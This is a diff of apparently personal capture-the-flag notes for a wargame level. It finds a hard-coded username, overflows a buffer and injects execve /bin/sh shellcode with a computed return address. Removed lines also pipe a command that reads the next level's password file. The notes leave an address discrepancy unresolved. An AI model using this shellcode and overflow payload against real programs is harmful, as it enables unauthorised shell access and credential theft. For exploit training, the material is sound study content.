@@ -1,46 +1,43 @@
 # level01
+
+## find username
+
 ```
 Username: dat_wil
 ```
 
-
-
+## buffer overflow
 ```
-x/s 0x80486a8 : "dat_wil"
+python -c 'print "dat_wil\n" + "x"*80 + "abcd"' > /tmp/01
+/tmp/01 > ./level01
 ```
+this command makes segfault at `64636261`
 
+## find address 
+with `ltrace ./level01`, 
 ```
-shellcode: 
-\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
-\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80
+fgets(ls
+"ls\n", 100, 0xf7fcfac0) = 0xffffd6ac
 ```
+-> `\xff\xff\xd6\xac`
 
+**mystery** : when we check in gdb, it's `\xff\xff\xd6\x7c` but with this, we get segfault...
+
+## exploit
 ```
-python -c 'print "dat_wil\n" + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
-" + "a"*80 " "<address we want>"'  > /tmp/01
-
-(python -c '''
-
-user = "dat_wil"
+python -c '''
+user = "dat_wil\n"
 shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
-padding = "X" * (80 - len(shellcode))
+padding = "x"*(80-len(shellcode))
+address = "\xff\xff\xd6\x7c"[::-1]
+print user + shellcode + padding + address
+''' > /tmp/01
 
-print user + shellcode + padding + "\x08\x04\xa0\x47"[::-1]
-
-'''; echo "cat /home/users/level02/.pass" ) | ./level01
-
-(python -c '''
-
-user = "dat_wil"
-shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
-padding = "X" * (80 - len(shellcode))
-
-print user + shellcode + padding + "\x08\x04\xa0\x47"[::-1]
-
-'''; echo "cat /home/users/level02/.pass" ) | ./level01
+cat /tmp/01 - | ./level01
 ```
 
 
+## asm 
 ```
 0x8048467 <verify_user_name+3>  push   %edi
 0x8048468 <verify_user_name+4>  push   %esi
